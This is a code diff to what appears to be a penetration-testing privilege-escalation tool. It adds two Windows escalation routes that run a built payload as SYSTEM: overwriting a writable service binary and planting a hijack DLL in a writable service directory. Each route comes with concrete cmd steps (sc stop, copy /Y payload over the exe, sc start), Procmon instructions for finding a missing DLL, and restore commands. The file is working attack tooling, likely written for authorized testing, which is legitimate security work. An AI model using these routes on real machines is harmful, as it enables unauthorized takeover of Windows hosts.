@@ -25,6 +25,18 @@ _PROOF = {LINUX: "id", WINDOWS: "whoami"}
 
 
 @dataclass(frozen=True)
+class Playbook:
+    """Operator steps for a route fieldkit *prepares* but can't safely one-shot (it would
+    have to overwrite/plant into an already-running service). fieldkit builds the artifact
+    and this says where to place it and what to run — see `fieldkit prep`."""
+
+    summary: str
+    place: str            # where the built artifact goes on the target
+    steps: tuple          # ordered, concrete operator steps
+    restore: str = None   # how to undo it afterwards
+
+
+@dataclass(frozen=True)
 class Vector:
     """One runnable, ranked escalation. ``command`` is the target-side proof."""
 
@@ -50,6 +62,13 @@ class Vector:
     #: then stages — the loop builds+pushes these on a miss, rebuilds corrected on a
     #: BAD_BUILD. ``build_command`` is what the built artifact runs (None → poc's proof).
     builds: tuple = ()
+    #: set when the route needs operator hands after fieldkit builds the artifact — the
+    #: escalate loop won't auto-fire it; `fieldkit prep` renders the steps.
+    playbook: object = None
+
+    @property
+    def manual(self):
+        return self.playbook is not None
 
     @property
     def score(self):
@@ -448,7 +467,7 @@ def _d_win_weak_service(facts, ctx):
         # a native one-shot: repoint binPath to a command that runs as SYSTEM when the
         # SCM starts it (it then read-backs the proof), and restore binPath after. No
         # payload to build — the binPath value *is* the command.
-        proof = f"{stage}\\sc_{re.sub(r'[^A-Za-z0-9]', '_', name)}.txt"
+        proof = f"{stage}\\sc_{_slug(name)}.txt"
         yield Vector(
             key=f"weakservice:{name}", title=f"weak service perms ({name}) → SYSTEM",
             exploitability="high", safety="config-change", detection="moderate",
@@ -465,10 +484,75 @@ def _d_win_weak_service(facts, ctx):
             report_type="weak_service_perms")
 
 
+def _slug(name):
+    return re.sub(r"[^A-Za-z0-9]", "_", name)
+
+
+def _d_win_writable_service(facts, ctx):
+    # the service binary itself is writable. Overwriting a *running* exe is file-locked,
+    # so this is a prepared, operator-driven route: fieldkit builds the payload and stages
+    # it to a temp path; the operator stops the service, overwrites, and starts it.
+    stage = ctx.stage_win
+    for name, exe in sorted(facts.writable_service_bins.items()):
+        staged = f"{stage}\\svc_{_slug(name)}.exe"
+        yield Vector(
+            key=f"writablesvc:{name}", title=f"writable service binary ({name}) → SYSTEM",
+            exploitability="high", safety="config-change", detection="moderate",
+            command=f"(manual) overwrite {exe} with the built payload, restart {name}",
+            shell="cmd", host=ctx.host,
+            detail=f"the binary {exe!r} of service {name} is writable by a broad group — "
+                   "replace it and restart to run as SYSTEM.",
+            evidence=f"icacls {exe}: writable by a broad group",
+            report_type="writable_service_binary",
+            builds=(("exe", staged, None),),
+            playbook=Playbook(
+                summary=f"Replace {name}'s writable binary with the built payload.",
+                place=exe,
+                steps=(
+                    f"back up the original: copy \"{exe}\" \"{exe}.bak\"",
+                    f"sc stop {name}",
+                    f"copy /Y {staged} \"{exe}\"",
+                    f"sc start {name}   (it now runs the payload as SYSTEM)",
+                ),
+                restore=f"sc stop {name} & copy /Y \"{exe}.bak\" \"{exe}\" & sc start {name} "
+                        f"& del {staged} \"{exe}.bak\""))
+
+
+def _d_win_dll_hijack(facts, ctx):
+    # a directory the service loads from is writable — plant a DLL it search-order-loads.
+    # Which DLL is a target requires Procmon, so this is operator-driven too.
+    stage = ctx.stage_win
+    for name, dir_ in sorted(facts.writable_service_dirs.items()):
+        if name in facts.writable_service_bins:
+            continue  # a writable binary is the simpler route — don't offer both
+        staged = f"{stage}\\hj_{_slug(name)}.dll"
+        yield Vector(
+            key=f"dllhijack:{name}", title=f"service DLL hijack ({name}) → SYSTEM",
+            exploitability="medium", safety="config-change", detection="moderate",
+            command=f"(manual) plant a hijack DLL in {dir_}, restart {name}",
+            shell="cmd", host=ctx.host,
+            detail=f"the directory {dir_!r} that service {name} loads from is writable — "
+                   "plant a DLL it search-order-loads to run as SYSTEM.",
+            evidence=f"icacls {dir_}: writable by a broad group",
+            report_type="service_dll_hijack",
+            builds=(("dll", staged, None),),
+            playbook=Playbook(
+                summary=f"Plant a hijack DLL in {name}'s writable directory.",
+                place=dir_,
+                steps=(
+                    f"find a DLL {name} loads but can't find (Procmon: filter "
+                    "Result='NAME NOT FOUND', Path ends '.dll') — call it X.dll",
+                    f"copy /Y {staged} {dir_}\\X.dll   (rename to the missing DLL)",
+                    f"sc stop {name} & sc start {name}   (or reboot for a boot-start service)",
+                ),
+                restore=f"del {dir_}\\X.dll {staged} & sc start {name}"))
+
+
 #: OS -> the drivers that apply. Append to extend the knowledge base.
 DRIVERS = {
     LINUX: (_d_sudo_all, _d_sudo_gtfo, _d_suid_gtfo, _d_caps, _d_docker_group, _d_sudo_env),
-    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted, _d_win_weak_service),
+    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted, _d_win_weak_service,
+              _d_win_writable_service, _d_win_dll_hijack),
 }
 
 
